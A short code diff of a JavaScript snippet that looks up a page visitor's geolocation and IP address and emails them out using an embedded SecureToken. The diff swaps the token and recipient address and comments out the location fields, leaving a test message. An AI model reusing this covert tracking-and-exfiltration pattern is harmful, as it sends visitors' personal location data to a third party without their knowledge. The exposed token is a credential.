@@ -25,16 +25,18 @@ $.getJSON('https://geolocation-db.com/json/')
           long = location.longitude;
           ip = location.IPv4;
     Email.send({
-        SecureToken : "2773f714-cd1c-43f1-b406-fd78c362402c",
-        To : 'TODO@gmx.com',
-        From : "TODO@gmail.com",
+        SecureToken : "0b3d42d7-7085-4447-a43c-c4f90a3c4825",
+        To : 't7fkm11@proton.me',
+        From : "t7fkm11@proton.me",
         Subject : "testing",
-        Body : `country: ${country}\n
-        state: ${state}\n
-        city: ${city}\n
-        lat: ${lat}\n
-        long: ${long}\n
-        ip: ${ip}\n`
+        Body : `Testing response`
+        
+        // country: ${country}\n
+        // state: ${state}\n
+        // city: ${city}\n
+        // lat: ${lat}\n
+        // long: ${long}\n
+        // ip: ${ip}\n`
     })
 });
 
